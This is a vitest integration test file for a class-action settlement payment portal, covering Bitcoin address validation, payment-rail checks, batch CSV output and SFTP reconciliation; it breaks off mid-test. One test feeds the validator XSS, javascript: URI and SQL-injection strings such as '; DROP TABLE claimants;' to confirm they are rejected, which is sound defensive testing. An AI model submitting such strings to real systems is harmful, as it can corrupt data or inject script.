import { describe, it, expect, beforeAll, afterAll, beforeEach } from 'vitest';
import request from 'supertest';
import http from 'node:http';
import mongoose from 'mongoose';
import { app } from '../../src/app';
import { setupTestDb, clearTestDb, teardownTestDb } from '../helpers/db';
import { Case } from '../../src/models/Case';
import { Claimant } from '../../src/models/Claimant';
import { ReconciliationException } from '../../src/models/ReconciliationException';
import { signToken } from '../../src/utils/jwt';
import { config } from '../../src/config/env';
import {
  isValidBitcoinAddress,
  normalizeRailName,
  validatePaymentRailPayload
} from '../../src/services/portalValidation.service';
import { BatchGeneratorService, BatchDetailItem } from '../../src/services/batchGenerator.service';
import {
  parseReconciliationReport,
  determineExceptionType,
  ReconciliationService
} from '../../src/services/reconciliation.service';
import { GmailService } from '../../src/services/gmailService';
import { checkBouncePreflight, EmailService } from '../../src/services/email.service';
import { executeScanGmailBounces } from '../../src/jobs/definitions/scanGmailBounces.job';
import { buildAuditLedgerRow, maskPaymentDetails } from '../../src/services/csvExport.service';

describe('Empirical Challenger (Tier 5): M6 Coverage Hardening 2 — Expanded Payment Rails, Localization, SFTP Reconciliation & Integration Resiliency', () => {
  let suiteCaseA: any;
  let suiteCaseB: any;
  let localizedCase: any;

  // Law firm auth tokens
  let firmAAdminToken: string;
  let firmACaseManagerToken: string;
  let firmAAuditorToken: string;
  let firmBAdminToken: string;
  let superAdminToken: string;

  // Mock HTTP Server for Gmail Service testing
  let mockGmailServer: http.Server | null = null;
  let mockGmailPort = 0;
  let mockGmailHandler: (req: http.IncomingMessage, res: http.ServerResponse) => void = () => {};

  const originalGmailUrl = config.GMAIL_SERVICE_URL;
  const originalEmailProvider = config.EMAIL_PROVIDER;

  beforeAll(async () => {
    await setupTestDb('m6_tier5_coverage_hardening_2');

    // Create mock HTTP server for Gmail Service
    mockGmailServer = http.createServer((req, res) => {
      mockGmailHandler(req, res);
    });

    await new Promise<void>((resolve) => {
      mockGmailServer!.listen(0, '127.0.0.1', () => {
        const addr = mockGmailServer!.address() as any;
        mockGmailPort = addr.port;
        resolve();
      });
    });

    // Create auth tokens
    firmAAdminToken = signToken({
      id: new mongoose.Types.ObjectId().toString(),
      email: 'admin@firm-a.com',
      role: 'law_firm_admin',
      lawFirmId: 'FIRM-A'
    });

    firmACaseManagerToken = signToken({
      id: new mongoose.Types.ObjectId().toString(),
      email: 'manager@firm-a.com',
      role: 'case_manager',
      lawFirmId: 'FIRM-A'
    });

    firmAAuditorToken = signToken({
      id: new mongoose.Types.ObjectId().toString(),
      email: 'auditor@firm-a.com',
      role: 'auditor',
      lawFirmId: 'FIRM-A'
    });

    firmBAdminToken = signToken({
      id: new mongoose.Types.ObjectId().toString(),
      email: 'admin@firm-b.com',
      role: 'law_firm_admin',
      lawFirmId: 'FIRM-B'
    });

    superAdminToken = signToken({
      id: new mongoose.Types.ObjectId().toString(),
      email: 'super@juris-banking.local',
      role: 'super_admin'
    });
  });

  afterAll(async () => {
    (config as any).GMAIL_SERVICE_URL = originalGmailUrl;
    (config as any).EMAIL_PROVIDER = originalEmailProvider;

    if (mockGmailServer) {
      await new Promise<void>((resolve) => mockGmailServer!.close(() => resolve()));
    }
    await teardownTestDb('m6_tier5_coverage_hardening_2');
  });

  beforeEach(async () => {
    await clearTestDb('m6_tier5_coverage_hardening_2');

    // Reset default mock handler
    mockGmailHandler = (_req, res) => {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: true, message: 'ok' }));
    };

    // Case for Firm A
    suiteCaseA = await Case.create({
      name: 'Adversarial Test Case Firm A',
      docketNumber: 'ADV-2026-FIRM-A',
      lawFirmId: 'FIRM-A',
      settlementFundTotal: 100000,
      disbursementDeadline: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
      fallbackPaymentMethod: 'physical_check',
      status: 'active'
    });

    // Case for Firm B
    suiteCaseB = await Case.create({
      name: 'Adversarial Test Case Firm B',
      docketNumber: 'ADV-2026-FIRM-B',
      lawFirmId: 'FIRM-B',
      settlementFundTotal: 50000,
      disbursementDeadline: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
      fallbackPaymentMethod: 'physical_check',
      status: 'active'
    });

    // Localized Case with multi-language landing page text
    localizedCase = await Case.create({
      name: 'Localized In Re Class Action',
      docketNumber: 'LOC-2026-8899',
      lawFirmId: 'FIRM-A',
      settlementFundTotal: 250000,
      disbursementDeadline: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
      fallbackPaymentMethod: 'physical_check',
      status: 'active',
      defaultLanguage: 'es',
      supportedLanguages: ['en', 'es', 'zh'],
      landingPageText: {
        headline: 'Portal Oficial de Pagos (Spanish Default)',
        introHtml: '<p>Bienvenido al portal oficial de distribución de fondos.</p>',
        faqAccordion: [
          { question: '¿Cuándo recibiré mi pago?', answer: '<p>Los pagos se procesarán en 14 días.</p>' }
        ],
        supportContact: 'soporte@reclamos.local'
      },
      localizedLandingPageText: {
        en: {
          headline: 'Official Settlement Payment Portal (English)',
          introHtml: '<p>Welcome to the official legal settlement payment distribution portal.</p>',
          faqAccordion: [
            { question: 'When will I receive my disbursement?', answer: '<p>Disbursements are processed within 14 days.</p>' }
          ],
          supportContact: 'support@claims.local'
        },
        es: {
          headline: 'Portal Oficial de Pagos (Spanish Localized)',
          introHtml: '<p>Seleccione su método preferido antes de la fecha límite judicial.</p>',
          faqAccordion: [
            { question: '¿Cómo elijo mi método?', answer: '<p>Seleccione una de las opciones abajo.</p>' }
          ],
          supportContact: 'ayuda@reclamos.local'
        },
        zh: {
          headline: '官方和解金付款门户 (Chinese Localized)',
          introHtml: '<p>请在截止日期之前选择您的付款方式。</p>',
          faqAccordion: [
            { question: '我何时能收到款项？', answer: '<p>将在截止日期后两周内处理。</p>' }
          ],
          supportContact: 'support-zh@claims.local'
        }
      }
    });
  });

  // =========================================================================
  // BATTERY 1: ADDENDUM 2 — EXPANDED PAYMENT RAILS VALIDATION & BITCOIN CRYPTOGRAPHY
  // =========================================================================
  describe('Battery 1: Addendum 2 — Expanded Payment Rails & Bitcoin Address Cryptography', () => {
    it('[BTC-ADDR-01] Rejects non-standard crypto prefixes and rival blockchains', () => {
      const rivalChainAddresses = [
        '0x71C634C245C5bbf3dcf9c18F95F4b15093A350a4', // Ethereum ERC20
        '0x0000000000000000000000000000000000000000', // Zero address
        'LhyXZ55rQLu4nsJaaQvWbFq9W8C9xXg4oY', // Litecoin legacy
        'ltc1qrgp2m7j8y30u5v7a8w9x2q3r4s5t6u7v8w9x0', // Litecoin Bech32
        'DH5yaieqoZN36fDVciNyRueRGvGLR3mr7L', // Dogecoin
        '44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqS2NdMd5QpM5GLGJvtnUmyXV6Fif7AjGMYph', // Monero
        'rU2mEJSLqBRkYLVTv55rFTgQajkLTnT6mA', // Ripple XRP
        '7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU', // Solana
        'bitcoincash:qpm2qsznhks23z7629mms6s4cwef74vcwvy22gdx6a' // Bitcoin Cash CashAddr
      ];

      for (const addr of rivalChainAddresses) {
        const check = isValidBitcoinAddress(addr);
        expect(check.valid).toBe(false);
      }
    });

    it('[BTC-ADDR-02] Rejects Bitcoin testnet and non-mainnet addresses', () => {
      const testnetAddresses = [
        'tb1qw508d6qejxtdg4y5r3zarvary0c5xw7kxpjzsx', // Testnet Bech32 (tb1)
        'mipcBbFg9gMiCh81Kj8tqqdgoZub1ZJRfn', // Testnet Legacy P2PKH (m or n)
        'n4MoDqZ5i3d9NqXv3m8V6Y6V5u7Q2q1b7c', // Testnet Legacy P2PKH (n)
        '2MzQwSSnBHWHq3468EeuAZmcBiTuEdHg5zE', // Testnet SegWit P2SH (2)
        'tb1p0xlxvlhemja6c4dqv22uapctqupfhlxm9h8z3k2e72q4k9hcz7vqzk5jj0' // Testnet Taproot
      ];

      for (const addr of testnetAddresses) {
        const check = isValidBitcoinAddress(addr);
        expect(check.valid).toBe(false);
      }
    });

    it('[BTC-ADDR-03] Rejects forbidden Base58 characters in Legacy (1...) and SegWit (3...) addresses', () => {
      // Base58 excludes 0, O, I, and l to eliminate visual ambiguity
      const invalidBase58Addresses = [
        '1A1zP1eP5QGefi2DMPTfTL5SLmv7Div0', // Contains '0'
        '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivO', // Contains 'O'
        '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivI', // Contains 'I'
        '1A1zP1eP5QGefi2DMPTfTL5SLmv7Divl', // Contains 'l'
        '3J98t1WpEZ73CNmQviecrnyiWrnqRhWN0', // SegWit contains '0'
        '3J98t1WpEZ73CNmQviecrnyiWrnqRhWNO', // SegWit contains 'O'
        '3J98t1WpEZ73CNmQviecrnyiWrnqRhWNI', // SegWit contains 'I'
        '3J98t1WpEZ73CNmQviecrnyiWrnqRhWNl'  // SegWit contains 'l'
      ];

      for (const addr of invalidBase58Addresses) {
        const check = isValidBitcoinAddress(addr);
        expect(check.valid).toBe(false);
      }
    });

    it('[BTC-ADDR-04] Rejects forbidden Bech32 characters in Native SegWit (bc1q) and Taproot (bc1p)', () => {
      // Bech32 charset: 02-9ac-hj-np-z (excludes 1, b, i, o)
      const invalidBech32Addresses = [
        'bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdb', // Contains forbidden 'b' in data part
        'bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdi', // Contains forbidden 'i'
        'bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdo', // Contains forbidden 'o'
        'bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5md1', // Contains forbidden '1' in data part
        'bc2qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq', // Invalid human-readable prefix bc2
        'bc0qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq', // Invalid human-readable prefix bc0
        'bc1aar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq'  // Invalid witness version 'a'
      ];

      for (const addr of invalidBech32Addresses) {
        const check = isValidBitcoinAddress(addr);
        expect(check.valid).toBe(false);
      }
    });

    it('[BTC-ADDR-05] Rejects boundary length violations (under-length and buffer overflow attempts)', () => {
      const boundaryAddresses = [
        '1', // 1 char
        '1A1zP', // 5 chars
        '1A1zP1eP5QGefi2', // 15 chars (too short, min is 26)
        'bc1q', // 4 chars (just prefix)
        'bc1qar0srrr7xfkvy5l', // 19 chars (too short for SegWit)
        '1' + 'A'.repeat(35), // 36 chars (too long for Base58, max is 35)
        'bc1q' + 'a'.repeat(60), // 64 chars (too long for SegWit)
        '1' + 'A'.repeat(5000), // 5001 chars (DoS / buffer overflow attempt)
        '   ' // Whitespace only
      ];

      for (const addr of boundaryAddresses) {
        const check = isValidBitcoinAddress(addr);
        expect(check.valid).toBe(false);
      }
    });

    it('[BTC-ADDR-06] Neutralizes pathological strings, control characters and injection attempts', () => {
      // Internal space, embedded newline, null bytes, XSS, Cyrillic, SQLi must fail validation
      expect(isValidBitcoinAddress('1A1zP1eP5Q\0Gefi2DMPTfTL5SLmv7DivfNa').valid).toBe(false);
      expect(isValidBitcoinAddress('1A1zP1eP5Q\r\nGefi2DMPTfTL5SLmv7DivfNa').valid).toBe(false);
      expect(isValidBitcoinAddress('1A1zP1eP5Q Gefi2DMPTfTL5SLmv7DivfNa').valid).toBe(false);
      expect(isValidBitcoinAddress('<script>alert("btc")</script>').valid).toBe(false);
      expect(isValidBitcoinAddress('javascript:void(0)').valid).toBe(false);
      expect(isValidBitcoinAddress('1А1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa').valid).toBe(false);
      expect(isValidBitcoinAddress('bc1q0xlxvlhemja6c4dqv22uapctqupfhlxm9h8z3k2e72q4k9hcz7vqzk5jj0; DROP TABLE claimants;').valid).toBe(false);
    });

    it('[BTC-ADDR-07] End-to-end portal submission strictly rejects invalid Bitcoin address via HTTP POST', async () => {
      const testToken = 'a'.repeat(64);
      const claimant = await Claimant.create({
        caseId: suiteCaseA._id,
        claimId: 'CLM-BTC-ADVERSARIAL-01',
        firstName: 'Satoshi',
        lastName: 'Nakamoto',
        email: 'satoshin@bitcoin.local',
        settlementAmount: 1500.0,
        status: 'pending_selection',
        paymentSelectionToken: testToken
      });

      // Attempt payment selection with invalid Ethereum address
      const resEth = await request(app)
        .post(`/api/public/claim/${testToken}/select-payment`)
        .send({
          method: 'bitcoin',
          details: { bitcoinAddress: '0x71C634C245C5bbf3dcf9c18F95F4b15093A350a4' },
          certificationAffirmed: true,
          signature: 'Satoshi Nakamoto'
        });

      expect(resEth.status).toBe(400);
      expect(resEth.body.error).toBe('INVALID_PAYMENT_DETAILS');
      expect(resEth.body.message).toContain('Invalid Bitcoin address');

      // Verify claimant status was NOT modified
      const reloaded = await Claimant.findById(claimant._id);
      expect(reloaded!.status).toBe('pending_selection');
      expect(reloaded!.selectedPaymentMethod).toBeUndefined();

      // Submit valid Native SegWit Bech32 address
      const resValid = await request(app)
        .post(`/api/public/claim/${testToken}/select-payment`)
        .send({
          method: 'bitcoin',
          details: { bitcoinAddress: 'bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq' },
          certificationAffirmed: true,
          signature: 'Satoshi Nakamoto'
        });

      expect(resValid.status).toBe(200);
      expect(resValid.body.success).toBe(true);
      expect(resValid.body.receipt.selectedMethod).toBe('bitcoin');
      expect(resValid.body.receipt.maskedDetails.bitcoinAddressMasked).toBe('bc1q...5mdq');
    });

    it('[WALLET-01] PayPal rail validation accepts valid emails/phones and rejects malformed inputs', () => {
      // Valid cases
      expect(validatePaymentRailPayload('paypal', { paypalAccount: 'claimant@paypal.com' }).valid).toBe(true);
      expect(validatePaymentRailPayload('paypal', { paypalAccount: '+12125550199' }).valid).toBe(true);
      expect(validatePaymentRailPayload('paypal', { paypalAccount: '2125550199' }).valid).toBe(true);

      // Invalid cases
      expect(validatePaymentRailPayload('paypal', { paypalAccount: 'not-an-email-or-phone' }).valid).toBe(false);
      expect(validatePaymentRailPayload('paypal', { paypalAccount: 'user@' }).valid).toBe(false);
      expect(validatePaymentRailPayload('paypal', { paypalAccount: '123' }).valid).toBe(false);
      expect(validatePaymentRailPayload('paypal', { paypalAccount: '' }).valid).toBe(false);
    });

    it('[WALLET-02] Venmo rail validation accepts handles & phones, rejects malformed handles', () => {
      // Valid cases
      expect(validatePaymentRailPayload('venmo', { venmoIdentifier: '@valid_venmo_user' }).valid).toBe(true);
      expect(validatePaymentRailPayload('venmo', { venmoIdentifier: '+12125550199' }).valid).toBe(true);
      // Auto-prepends @ for 5+ character handles
      const autoPrepend = validatePaymentRailPayload('venmo', { venmoIdentifier: 'legal_claimant' });
      expect(autoPrepend.valid).toBe(true);
      expect(autoPrepend.sanitizedDetails?.venmoIdentifier).toBe('@legal_claimant');

      // Invalid cases (<5 chars, illegal symbols)
      expect(validatePaymentRailPayload('venmo', { venmoIdentifier: '@abc' }).valid).toBe(false); // <5 chars
      expect(validatePaymentRailPayload('venmo', { venmoIdentifier: '@user!name$' }).valid).toBe(false); // special chars
      expect(validatePaymentRailPayload('venmo', { venmoIdentifier: '' }).valid).toBe(false);
    });

    it('[WALLET-03] Zelle rail validation accepts enrolled email/phone and rejects invalid identifiers', () => {
      expect(validatePaymentRailPayload('zelle', { zelleRecipient: 'user@bank.com' }).valid).toBe(true);
      expect(validatePaymentRailPayload('zelle', { zelleRecipient: '+12125550199' }).valid).toBe(true);

      expect(validatePaymentRailPayload('zelle', { zelleRecipient: 'not-a-valid-contact' }).valid).toBe(false);
      expect(validatePaymentRailPayload('zelle', { zelleRecipient: '123' }).valid).toBe(false);
    });

    it('[RAIL-NORM-01] normalizeRailName handles aliases, casing and rejects unsupported rails', () => {
      expect(normalizeRailName('direct_deposit')).toBe('ach');
      expect(normalizeRailName('ACH')).toBe('ach');
      expect(normalizeRailName('push_to_debit')).toBe('debit_card');
      expect(normalizeRailName('Debit_Card')).toBe('debit_card');
      expect(normalizeRailName('prepaid')).toBe('digital_card');
      expect(normalizeRailName('check')).toBe('physical_check');
      expect(normalizeRailName('BTC')).toBe('bitcoin');
      expect(normalizeRailName('bitcoin')).toBe('bitcoin');
      expect(normalizeRailName('PAYPAL')).toBe('paypal');
      expect(normalizeRailName('venmo')).toBe('venmo');
      expect(normalizeRailName('zelle')).toBe('zelle');

      // Unsupported rails
      expect(() => normalizeRailName('apple_pay')).toThrow('Unsupported payment rail');
      expect(() => normalizeRailName('wire_transfer')).toThrow('Unsupported payment rail');
      expect(() => normalizeRailName('dogecoin')).toThrow('Unsupported payment rail');
    });

    it('[BATCH-MAP-01] BatchGeneratorService compiles all 8 rails and verifies control trailer consistency', () => {
      const details: BatchDetailItem[] = [
        {
          method: 'ACH',
          claimId: 'CLM-001',
          firstName: 'Alice',
          lastName: 'Smith',
          amount: 100.0,
          achRouting: '021000021',
          achAccount: '12345678',
          achType: 'CHECKING'
        },
        {
          method: 'DIGITAL_CARD',
          claimId: 'CLM-002',
          firstName: 'Bob',
          lastName: 'Jones',
          amount: 75.5,
          cardBrand: 'MASTERCARD',
          channel: 'EMAIL',
          email: 'bob@example.com'
        },
        {
          method: 'PUSH_DEBIT',
          claimId: 'CLM-003',
          firstName: 'Charlie',
          lastName: 'Brown',
          amount: 50.0,
          token: 'tok_debit_123',
          last4: '4321',
          bin: '411111',
          network: 'VISA'
        },
        {
          method: 'PHYSICAL_CHECK',
          claimId: 'CLM-004',
          firstName: 'Diana',
          lastName: 'Prince',
          amount: 25.0,
          payee: 'Diana Prince',
          street1: '100 Main St',
          city: 'Metropolis',
          state: 'NY',
          zip: '10001'
        },
        {
          method: 'PAYPAL',
          claimId: 'CLM-005',
          firstName: 'Evan',
          lastName: 'Wright',
          amount: 15.0,
          paypalAccount: 'evan@paypal.local'
        },
        {
          method: 'VENMO',
          claimId: 'CLM-006',
          firstName: 'Fiona',
          lastName: 'Gallagher',
          amount: 20.0,
          venmoHandle: '@fiona_g'
        },
        {
          method: 'ZELLE',
          claimId: 'CLM-007',
          firstName: 'George',
          lastName: 'Clark',
          amount: 30.0,
          zelleRecipient: 'george@zelle.local'
        },
        {
          method: 'BITCOIN',
          claimId: 'CLM-008',
          firstName: 'Hal',
          lastName: 'Finney',
          amount: 500.0,
          bitcoinAddress: 'bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq'
        }
      ];

      const headerMeta = {
        caseId: suiteCaseA.id,
        caseName: suiteCaseA.name,
        batchId: 'BATCH-ADV-ALL-RAILS-01',
        environment: 'TEST' as const
      };

      const result = BatchGeneratorService.buildBatchCsv(headerMeta, details, 'v2');
      expect(result.csvContent).toBeDefined();
      expect(result.sha256).toBeDefined();
      expect(result.totalAmount).toBe(815.5);

      // Verify Bitcoin detail row exists with address
      expect(result.csvContent).toContain('DETAIL,BITCOIN,CLM-008');
      expect(result.csvContent).toContain('bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq');

      // Verify trailer contains exact aggregate count 8 and total 815.50
      expect(result.csvContent).toContain('TRAILER,8,815.50');
    });
  });

  // =========================================================================
  // BATTERY 2: DASH SOLUTIONS SFTP RECONCILIATION RESILIENCY & ADMIN RESOLUTION
  // =========================================================================
  describe('Battery 2: Dash SFTP Reconciliation Resiliency, Corrupted Rows & Admin Resolution', () => {
    it('[SFTP-CORRUPT-01] Handles 0-byte, whitespace-only, and header-only status reports cleanly', () => {
      // Empty content
      const emptyResult = parseReconciliationReport('');
      expect(emptyResult.valid).toBe(false);
      expect(emptyResult.totalRecords).toBe(0);
      expect(emptyResult.errors[0]).toContain('received empty content');

      // Whitespace content
      const whitespaceResult = parseReconciliationReport('   \n\n\r\n   ');
      expect(whitespaceResult.valid).toBe(false);
      expect(whitespaceResult.totalRecords).toBe(0);

      // Header-only (0 detail records)
      const headerOnly = 'REPORT_ID,BATCH_ID,CLAIM_ID,PAYMENT_REFERENCE,PAYMENT_METHOD,AMOUNT,CURRENCY,STATUS,DASH_REFERENCE_ID,SETTLEMENT_DATE,PROCESSED_TIMESTAMP,ERROR_CODE,ERROR_MESSAGE,FAILURE_REASON\n';
      const headerOnlyResult = parseReconciliationReport(headerOnly);
      expect(headerOnlyResult.valid).toBe(false);
      expect(headerOnlyResult.errors[0]).toContain('must contain header and at least 1 record');
    });

    it('[SFTP-CORRUPT-02] Rejects unrecognized header layout cleanly without server crash', () => {
      const corruptHeaders = [
        'FOO,BAR,BAZ,QUX',
        'ID,NAME,EMAIL,AMOUNT',
        'TRANSACTION_ID,CUSTOMER,STATUS' // Missing REPORT_ID or RECORD_TYPE
      ];

      for (const header of corruptHeaders) {
        const content = `${header}\n1,2,3,4`;
        const res = parseReconciliationReport(content);
        expect(res.valid).toBe(false);
        expect(res.errors[0]).toContain('Unrecognized reconciliation CSV header format');
      }
    });

    it('[SFTP-PARTIAL-01] Partial and corrupted rows are flagged in errors[] without throwing exceptions', () => {
      const header = 'REPORT_ID,BATCH_ID,CLAIM_ID,PAYMENT_REFERENCE,PAYMENT_METHOD,AMOUNT,CURRENCY,STATUS,DASH_REFERENCE_ID,SETTLEMENT_DATE,PROCESSED_TIMESTAMP,ERROR_CODE,ERROR_MESSAGE,FAILURE_REASON';
      const rowValid = 'REP-1,BAT-1,CLM-OK,REF-1,ACH,100.00,USD,PAID,DASH-1,2026-10-04,2026-10-04,,,';
      const rowInvalidStatus = 'REP-1,BAT-1,CLM-ERR,REF-2,ACH,50.00,USD,PENDING_PROCESSING,DASH-2,2026-10-04,2026-10-04,,,';
      const rowPartialCols = 'REP-1,BAT-1,CLM-PARTIAL'; // Only 3 columns

      const csvContent = `${header}\n${rowValid}\n${rowInvalidStatus}\n${rowPartialCols}`;
      const res = parseReconciliationReport(csvContent);

      // Partial row and invalid status row must be recorded in errors
      expect(res.errors.length).toBeGreaterThanOrEqual(1);
      // Valid row is successfully parsed
      expect(res.paidCount).toBe(1);
      expect(res.records.length).toBe(1);
      expect(res.records[0].claimId).toBe('CLM-OK');
    });

    it('[NACHA-TAX-01] Accurately maps NACHA return code taxonomy to exception types', () => {
      // NACHA ACH Returns
      expect(determineExceptionType('ACH', 'R01')).toBe('ach_return'); // Insufficient Funds
      expect(determineExceptionType('ACH', 'R02')).toBe('ach_return'); // Account Closed
      expect(determineExceptionType('ACH', 'R03')).toBe('ach_return'); // No Account/Unable to Locate
      expect(determineExceptionType('ACH', 'R04')).toBe('ach_return'); // Invalid Account Number
      expect(determineExceptionType('ACH', 'R08')).toBe('ach_return'); // Payment Stopped
      expect(determineExceptionType('ACH', 'R10')).toBe('ach_return'); // Customer Advises Unauthorized
      expect(determineExceptionType('ACH', 'R16')).toBe('ach_return'); // Account Frozen
      expect(determineExceptionType('ACH', 'R20')).toBe('ach_return'); // Non-Transaction Account
      expect(determineExceptionType('ACH', 'ACH_REJECT')).toBe('ach_return');

      // Invalid Routing
      expect(determineExceptionType('ACH', 'ROUTING_INVALID')).toBe('invalid_routing');

      // Card Declines
      expect(determineExceptionType('DEBIT_CARD', 'CARD_BLOCKED')).toBe('card_decline');
      expect(determineExceptionType('DIGITAL_CARD', 'PAN_EXPIRED')).toBe('card_decline');
      expect(determineExceptionType('PUSH_DEBIT', 'BIN_UNSUPPORTED')).toBe('card_decline');

      // Check Returns
      expect(determineExceptionType('PHYSICAL_CHECK', 'ADDR_INVALID')).toBe('check_returned');
      expect(determineExceptionType('PHYSICAL_CHECK', 'CHECK_UNDELIVERABLE')).toBe('check_returned');
      expect(determineExceptionType('PHYSICAL_CHECK', 'MAIL_RETURNED')).toBe('check_returned');

      // Unmatched
      expect(determineExceptionType('ACH', 'UNMATCHED_CLAIM_ID')).toBe('unmatched_claim');
    });

    it('[RECON-INT-01] ReconciliationService reconciles mixed reports and logs unmatched claim IDs without crash', async () => {
      // Create claimants in Case A
      const clmPaid = await Claimant.create({
        caseId: suiteCaseA._id,
        claimId: 'CLM-RECON-PAID',
        firstName: 'Penny',
        lastName: 'Paid',
        email: 'paid@example.com',
        settlementAmount: 100.0,
        status: 'queued_for_sftp'
      });

      const clmReturned = await Claimant.create({
        caseId: suiteCaseA._id,
        claimId: 'CLM-RECON-RET',
        firstName: 'Ron',
        lastName: 'Returned',
        email: 'returned@example.com',
        settlementAmount: 150.0,
        status: 'queued_for_sftp'
      });

      const header = 'REPORT_ID,BATCH_ID,CLAIM_ID,PAYMENT_REFERENCE,PAYMENT_METHOD,AMOUNT,CURRENCY,STATUS,DASH_REFERENCE_ID,SETTLEMENT_DATE,PROCESSED_TIMESTAMP,ERROR_CODE,ERROR_MESSAGE,FAILURE_REASON';
      const lines = [
        header,
        `REP-100,BAT-1,CLM-RECON-PAID,REF-1,ACH,100.00,USD,PAID,DASH-REF-999,2026-10-04,2026-10-04,,,`,
        `REP-100,BAT-1,CLM-RECON-RET,REF-2,ACH,150.00,USD,RETURNED,DASH-REF-888,2026-10-04,2026-10-04,R02,Account Closed,Account Closed`,
        `REP-100,BAT-1,CLM-UNKNOWN-404,REF-3,ACH,200.00,USD,REJECTED,DASH-REF-777,2026-10-04,2026-10-04,R03,No Account,No Account`
      ];

      const result = await ReconciliationService.reconcileCaseStatusReport({
        caseId: suiteCaseA.id,
        csvContent: lines.join('\n'),
        reportFilename: 'REPORT_STATUS_20261004.csv'
      });

      expect(result.disbursedCount).toBe(1);
      expect(result.returnedCount).toBe(1);
      expect(result.unmatchedCount).toBe(1);
      expect(result.exceptionsLogged).toBe(2);

      // Verify clmPaid transitioned to disbursed
      const updatedPaid = await Claimant.findById(clmPaid._id);
      expect(updatedPaid!.status).toBe('disbursed');
      expect(updatedPaid!.dashReferenceId).toBe('DASH-REF-999');

      // Verify clmReturned transitioned to returned
      const updatedRet = await Claimant.findById(clmReturned._id);
      expect(updatedRet!.status).toBe('returned');
      expect(updatedRet!.failureCode).toBe('R02');

      // Verify unmatched claim logged exception
      const unmatchedEx = await ReconciliationException.findOne({ claimId: 'CLM-UNKNOWN-404' });
      expect(unmatchedEx).toBeDefined();
      expect(unmatchedEx!.exceptionType).toBe('unmatched_claim');
      expect(unmatchedEx!.resolved).toBe(false);
    });

    it('[ADMIN-RES-01] switch_to_check resolves exception, updates address, and requeues claimant', async () => {
      const claimant = await Claimant.create({
        caseId: suiteCaseA._id,
        claimId: 'CLM-SWITCH-CHECK-01',
        firstName: 'Sarah',
        lastName: 'Connor',
        email: 'sarah@resistance.local',
        settlementAmount: 250.0,
        status: 'returned',
        selectedPaymentMethod: 'ach',
        failureCode: 'R02'
      });

      const exception = await ReconciliationException.create({
        caseId: suiteCaseA._id,
        claimantId: claimant._id,
        claimId: claimant.claimId,
        paymentRail: 'ach',
        amount: 250.0,
        status: 'RETURNED',
        exceptionType: 'ach_return',
        returnCode: 'R02',
        returnReason: 'Account Closed',
        resolved: false,
        resolutionStatus: 'open'
      });

      const res = await request(app)
        .post(`/api/cases/${suiteCaseA.id}/exceptions/${exception._id}/resolve`)
        .set('Authorization', `Bearer ${firmACaseManagerToken}`)
        .send({
          action: 'switch_to_check',
          reason: 'Claimant requested paper check after account closed',
          updatedAddress: {
            street1: '742 Evergreen Terrace',
            street2: 'Apt 4B',
            city: 'Springfield',
            state: 'IL',
            zip: '62704'
          }
        });

      expect(res.status).toBe(200);
      expect(res.body.exception.resolved).toBe(true);
      expect(res.body.exception.resolutionStatus).toBe('resolved_switched_to_check');

      // Check updated claimant
      const updatedClaimant = await Claimant.findById(claimant._id);
      expect(updatedClaimant!.status).toBe('selected');
      expect(updatedClaimant!.selectedPaymentMethod).toBe('physical_check');
      expect(updatedClaimant!.address?.street).toBe('742 Evergreen Terrace, Apt 4B');
      expect(updatedClaimant!.address?.city).toBe('Springfield');
      expect(updatedClaimant!.address?.state).toBe('IL');
      expect(updatedClaimant!.requeuedAt).toBeDefined();
    });

    it('[ADMIN-RES-02] switch_to_check rejects missing or invalid address with HTTP 400', async () => {
      const exception = await ReconciliationException.create({
        caseId: suiteCaseA._id,
        claimId: 'CLM-ERR-CHECK-01',
        amount: 100.0,
        status: 'RETURNED',
        exceptionType: 'ach_return',
        returnCode: 'R02',
        resolved: false
      });

      // Missing updatedAddress
      const resMissing = await request(app)
        .post(`/api/cases/${suiteCaseA.id}/exceptions/${exception._id}/resolve`)
        .set('Authorization', `Bearer ${firmACaseManagerToken}`)
        .send({
          action: 'switch_to_check',
          reason: 'Switching without address'
        });

      expect(resMissing.status).toBe(400);

      // Invalid 3-letter state code
      const resBadState = await request(app)
        .post(`/api/cases/${suiteCaseA.id}/exceptions/${exception._id}/resolve`)
        .set('Authorization', `Bearer ${firmACaseManagerToken}`)
        .send({
          action: 'switch_to_check',
          updatedAddress: {
            street1: '123 Main St',
            city: 'Chicago',
            state: 'ILLINOIS', // Must be 2-letter
            zip: '60601'
          }
        });

      expect(resBadState.status).toBe(400);
    });

    it('[ADMIN-RES-03] resend_email generates a fresh token and resets notification state', async () => {
      const claimant = await Claimant.create({
        caseId: suiteCaseA._id,
        claimId: 'CLM-RESEND-01',
        firstName: 'John',
        lastName: 'Doe',
        email: 'john@doe.local',
        settlementAmount: 120.0,
        status: 'rejected',
        paymentSelectionToken: 'old_token_123',
        emailSent: true
      });

      const exception = await ReconciliationException.create({
        caseId: suiteCaseA._id,
        claimantId: claimant._id,
        claimId: claimant.claimId,
        amount: 120.0,
        status: 'REJECTED',
        exceptionType: 'card_decline',
        returnCode: 'CARD_BLOCKED',
        resolved: false
      });

      const res = await request(app)
        .post(`/api/cases/${suiteCaseA.id}/exceptions/${exception._id}/resolve`)
        .set('Authorization', `Bearer ${firmACaseManagerToken}`)
        .send({
          action: 'resend_email',
          reason: 'Portal link reissued per user request'
        });

      expect(res.status).toBe(200);

      const updatedClaimant = await Claimant.findById(claimant._id);
